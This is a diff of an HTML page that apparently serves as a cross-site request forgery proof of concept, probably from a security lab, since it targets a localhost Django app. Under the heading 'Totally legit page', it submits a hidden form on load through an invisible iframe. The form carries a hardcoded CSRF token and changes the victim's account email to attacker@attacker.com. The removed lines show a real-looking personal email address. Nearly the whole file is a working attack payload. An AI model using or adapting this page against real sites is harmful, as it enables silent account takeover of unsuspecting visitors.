@@ -1,62 +1,38 @@
 <html lang="en">
-<head>
-    <meta charset="utf-8"/>
-    <script src="https://code.jquery.com/jquery-3.3.1.min.js"> </script>
-</head>
-<body onload="document.forms[0].submit()">
-<!-- <body> -->
-<form id="form" method="post"
-    action="http://127.0.0.10:8000/accounts/change/email/" target="my_iframe"
-    style="visibility:hidden">
-   <input type="hidden" name="csrfmiddlewaretoken"
-      value="mz4LR3Umv8hpB2Go4VLNmkRslgLIwdgc1zr7m7YYhiys8cGES7xZSOQVD0534fgt">
-   <div class="alert alert-danger alert-dismissable alert-link"
-      role="alert">
-      <button class="close" type="button"
-         data-dismiss="alert"
-         aria-label="close">&#215;</button>
-      Please enter another email.
-   </div>
-   <div class="form-group is-invalid">
-      <label
-         for="id_email">Email</label><input type="email"
-         name="email" value="vbarzin@gmail.com123" class="form-control
-         is-invalid" placeholder="Email" title="" required
-         id="id_email">
-      <div class="invalid-feedback">Please enter another
-         email.
-      </div>
-   </div>
-   <input type="submit" class="btn btn-success">Change</button>
-</form>
-<iframe width="0" height="0" border="0" name="my_iframe" id="my_iframe"></iframe>
-<h1>Totally legit page</h1>
-    <script>
-//        $('form').submit(function (evt) {
-//        console.log(1);
-//        $.post(this.action, $(this).serialize());
-//       evt.preventDefault(); //prevents the default action
-//    
-//    })
-
-            console.log(1);
-            //document.forms[0].submit();
-            console.log("submitted");
-//    $('#form').submit(function(e){
-//    e.preventDefault();
-//    $.ajax({
-//        url:'http://127.0.0.1:8000/accounts/change/email/',
-//        type:'post',
-//        data:$('#form').serialize(),
-//        success:function(){
-//            //whatever you wanna do after the form is successfully submitted
-//            console.log(1);
-//        }
-//    });
-//});
-    
-    </script>
-</body>
-
+    <head>
+        <meta charset="utf-8"/>
+        <script src="https://code.jquery.com/jquery-3.3.1.min.js"> </script>
+    </head>
+    <body onload="document.forms[0].submit()">
+        <!-- <body> -->
+        <form id="form" method="post"
+                        action="http://127.0.0.10:8000/accounts/change/email/" target="my_iframe"
+                                                                               style="display:none">
+            <input type="hidden" name="csrfmiddlewaretoken"
+                                 value="mz4LR3Umv8hpB2Go4VLNmkRslgLIwdgc1zr7m7YYhiys8cGES7xZSOQVD0534fgt">
+            <div class="alert alert-danger alert-dismissable alert-link"
+                 role="alert">
+                <button class="close" type="button"
+                                      data-dismiss="alert"
+                                      aria-label="close">&#215;</button>
+                Please enter another email.
+            </div>
+            <div class="form-group is-invalid">
+                <label
+                 for="id_email">Email</label><input type="email"
+                                                    name="email"
+                                                    value="attacker@attacker.com" class="form-control
+                                                    is-invalid" placeholder="Email" title="" required
+                                                                                    id="id_email">
+             <div class="invalid-feedback">Please enter another
+                 email.
+             </div>
+            </div>
+            <input type="submit" class="btn btn-success">Change</button>
+        </form>
+        <iframe style="display:none" width="0" height="0" border="0" name="my_iframe" id="my_iframe"></iframe>
+        <h1>Totally legit page</h1>
+        <img src="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcTuFAEccpXJi9ycsn90oEhOtfHl1bMsPaTS33E_ad5SeiYdEZLzAQ" />
+        </body>
 </html>
 
